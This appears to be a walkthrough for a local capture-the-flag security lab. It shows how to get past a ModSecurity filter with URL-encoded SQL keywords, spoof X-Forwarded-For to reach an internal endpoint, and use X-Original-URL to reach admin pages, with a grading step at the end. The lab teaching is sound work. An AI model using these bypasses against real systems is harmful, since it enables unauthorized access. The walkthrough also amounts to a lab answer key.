# Lab-B Walkthrough (Student Flow)

## 1. Start the lab
```bash
docker build -t trustlab-lab-b ./lab-B
docker run -d --rm --name trustlab-lab-b -p 30000:30000 -p 30003:30003 -p 30004:30004 -p 8080:8080 trustlab-lab-b
```

Confirm the service is up:
```bash
curl -sS -o /dev/null -w '%{http_code}\n' http://localhost:30000/
```

Optional monitoring:
- ZAP GUI: `http://localhost:30004`
- ZAP Proxy: `http://localhost:8080`

## 2. FLAG1 — Bypass the search filter
- Direct request (blocked by ModSecurity):
  ```bash
  curl -i "http://localhost:30000/rest/products/search?q=union+select"
  ```
- Bypass example: encode spaces to avoid the naive check:
  ```bash
  curl -i "http://localhost:30000/rest/products/search?q=union%20select"
  ```
- Capture the flag from the `X-Lab-Flag1` response header.

## 3. FLAG2 — Access internal endpoint
- Blocked request (default ACL):
  ```bash
  curl -i http://localhost:30000/internal/device-status
  ```
- Bypass by spoofing the internal source header:
  ```bash
  curl -sS http://localhost:30000/internal/device-status -H "X-Forwarded-For: 10.0.0.1"
  ```
- Read the `flag` field from the JSON response.

## 4. FLAG3 — Reach the admin console
- Direct access is blocked:
  ```bash
  curl -i http://localhost:30000/admin-console
  ```
- Bypass by sending a safe path plus `X-Original-URL`:
  ```bash
  curl -sS http://localhost:30000/public/ -H "X-Original-URL: /admin-console"
  ```
- The returned HTML contains the `FLAG3:` line.

## 5. FLAG4 — Call the admin API
- Use the same routing trick:
  ```bash
  curl -sS http://localhost:30000/public/ -H "X-Original-URL: /rest/admin/application-version"
  ```
- Extract the `flag` field from the JSON response.

## 6. Submit your work
Inside the lab container, write the required files under `/home/labDirectory/`:
- `discovery.txt`: mention `Apache`, `ModSecurity`, and port `30000`.
- `enumeration.txt`: list 10+ endpoints, including at least one `/internal/` path.
- `bypass-technique.txt`: include the working `X-Original-URL` request you used.
- `flag.txt`: include FLAG1–FLAG4, one per line.

```bash
sh /home/.evaluationScripts/evaluate.sh
```
